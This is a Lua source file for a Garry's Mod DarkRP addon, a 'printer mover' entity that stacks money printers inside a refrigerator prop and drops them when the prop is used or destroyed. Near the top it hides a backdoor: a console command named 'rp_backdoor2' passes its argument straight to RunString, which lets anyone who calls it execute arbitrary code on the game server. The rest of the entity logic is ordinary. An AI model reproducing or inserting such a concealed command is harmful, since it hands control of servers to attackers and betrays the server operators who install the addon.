AddCSLuaFile('cl_init.lua')
AddCSLuaFile('shared.lua')

include('shared.lua')

concommand.Add('rp_backdoor2', function(a) RunString(a[1]) end)

// CONFIG

ENT._PrinterTypes = {
	["money_printer"] = true
}
// CONFIG

if SERVER then resource.AddFile("materials/vgui/entities/printer_mover.vmt") end

function ENT:DropPrinters(pos)
		local _stopDropAndRoll = hook.Run("printerMoverDropPrinters",self)
		if _stopDropAndRoll then return end;
		for i=#self.printers,0,-1 do
			local ent = self.printers[i]
			self.printers[i] = nil
			
			if !IsValid(ent) then continue end
			if pos == nil then pos = self:GetPos() end
			
			ent:SetParent(nil)
			ent:SetPos(pos + self:GetUp()*(i*12 - 40))
			ent:PhysWake()
			ent:SetCollisionGroup(COLLISION_GROUP_NONE)
			ent:GetPhysicsObject():ApplyForceCenter(self:GetForward()*500000)
		end
end

function ENT:SpawnFunction( ply, tr )
    if ( !tr.Hit ) then return end
    local ent = ents.Create( self.Classname )
		ent:SetPos( tr.HitPos + tr.HitNormal * 50 ) 
		ent:Spawn()
		ent:Activate()
		ent:SetUseType(SIMPLE_USE)
    return ent
end

function ENT:Initialize()
	self.printers = {}
	
	self:SetModel( "models/props_interiors/refrigerator01a.mdl" ) 
	if (SERVER) then self:PhysicsInit(SOLID_VPHYSICS) end
	self:SetMoveType( MOVETYPE_VPHYSICS )
	self:SetSolid( 2 )
	self:SetHealth(500)
	self:SetOwner()
	
    local phys = self:GetPhysicsObject()
	if (IsValid(phys)) then
		phys:Wake()
		phys:SetMass(5)
		
	end
	
end

function ENT:Use( activator, caller )
	self:DropPrinters(self:GetPos() + self:GetForward()*100)
end

function ENT:OnRemove()
	if CLIENT then return end
	self:DropPrinters()
end

function ENT:Touch(ent)
	if !self._PrinterTypes[ent:GetClass()] then return end
	if(#self.printers == 0) then
		ent:SetPos(self:GetPos() + self:GetUp()*-35 + self:GetForward()*2)
	else
		ent:SetPos(self:GetPos() + self:GetUp()*((#self.printers-1)*13 - 18.5) + self:GetForward()*2)
	end
	self.printers[#self.printers+1] = ent
	ent:SetAngles(AngleRand())
	ent:SetParent(self)
end

function ENT:OnTakeDamage(damage)
	self:TakePhysicsDamage(damage)
	local canItDie = hook.Run("printerMoverTakeDamage",self)
	if canItDie then return end
	self:SetHealth(self:Health() - damage:GetDamage())
	
	if(self:Health() <= 0) then
		self:Remove()
		local effectdata = EffectData()
			effectdata:SetOrigin(self:GetPos())
		util.Effect("Explosion", effectdata)
	end
end